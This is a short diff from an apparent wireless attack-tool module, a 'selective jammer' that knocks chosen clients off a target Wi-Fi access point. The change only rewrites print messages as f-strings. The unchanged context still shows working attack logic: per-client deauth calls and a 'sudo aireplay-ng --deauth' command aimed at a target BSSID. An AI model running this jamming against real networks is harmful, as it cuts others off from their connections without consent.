@@ -152,14 +152,14 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("DRY RUN — Selective Jammer")
-            print_info("Target AP: {} ch {}".format(self.target_bssid, self.target_channel))
-            print_info("Mode: {} | Clients: {}".format(self.mode, len(macs)))
+            print_info(f"Target AP: {self.target_bssid} ch {self.target_channel}")
+            print_info(f"Mode: {self.mode} | Clients: {len(macs)}")
             for m in macs[:10]:
-                print_info("  {}".format(m))
+                print_info(f"  {m}")
             return
 
-        print_status("Selective jammer — {} mode".format(self.mode))
-        print_info("Target AP: {} | Clients: {}".format(self.target_bssid, len(macs)))
+        print_status(f"Selective jammer — {self.mode} mode")
+        print_info(f"Target AP: {self.target_bssid} | Clients: {len(macs)}")
 
         start = time.time()
         try:
@@ -171,7 +171,7 @@ class Exploit(Exploit):
                     for mac in macs:
                         self._deauth_single(mac)
                 elif self.mode == "whitelist":
-                    print_info("Whitelist: broadcast deauth skipping {} clients".format(len(macs)))
+                    print_info(f"Whitelist: broadcast deauth skipping {len(macs)} clients")
                     subprocess.run([
                         "sudo", "aireplay-ng", "--deauth", str(self.deauth_count),
                         "-a", self.target_bssid, self.interface,
